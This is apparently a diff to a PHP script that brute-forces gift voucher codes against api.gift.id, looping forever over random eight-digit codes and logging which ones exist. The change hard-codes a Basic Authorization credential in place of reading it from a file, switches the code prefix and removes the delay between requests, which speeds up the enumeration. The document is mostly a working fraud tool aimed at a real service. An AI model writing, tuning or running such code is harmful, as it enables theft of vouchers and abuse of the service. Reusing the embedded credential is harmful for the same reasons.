@@ -59,8 +59,7 @@ class curl {
 $curl = new curl();
 $curl->ssl(0, 2);
 $headers = array();
-$auth = file('auth-c.txt'); 
-$headers[] = "Authorization: ".$auth[0]."";
+$headers[] = "Authorization: Basic cE0wNjMyMm5uQUhEU2VpZHpUdkFOczVIMzpVeWdJZHR6VXEzVlNjb1Y3RThXVW9ub1RDaWg1QmdwYnNsdjZPcHNKTzlFQWtMSEV5VQ==";
 $curl->header($headers);	
 while (true) {
 	$type = 1; // 1 tokped || 2 alfa
@@ -69,7 +68,7 @@ while (true) {
 	}else{
 		$type = 1662;
 	}
-	$code = 50;
+	$code = 46;
 	$asw = ''.$code.''.rand(0,9).''.rand(0,9).''.rand(0,9).''.rand(0,9).''.rand(0,9).''.rand(0,9).'';
 	$page = $curl->get('https://api.gift.id/v1/egifts/detail/'.$type.'/'.$asw.'');
 //echo $page;
@@ -106,11 +105,10 @@ $data =  "".$tada[1][1]." / ".$bl[1][0]." / ".$asw." / ".$x[1][2]." / \r\n";
 		ob_flush();
 }
 	} elseif (stripos($page, 'eVoucher not found')) {
-		//echo "DIE => ".$asw;
+		echo "DIE => ".$asw;		echo "\n";	
+		
 		flush();
 		ob_flush();
-		//echo "\n";	
-time_nanosleep(0, 300000000);		
 	}elseif (stripos($page, 'TooManyRequest')) {
 		echo "TOO MANY REQUEST : ".$asw;
 		echo "\n";		flush();
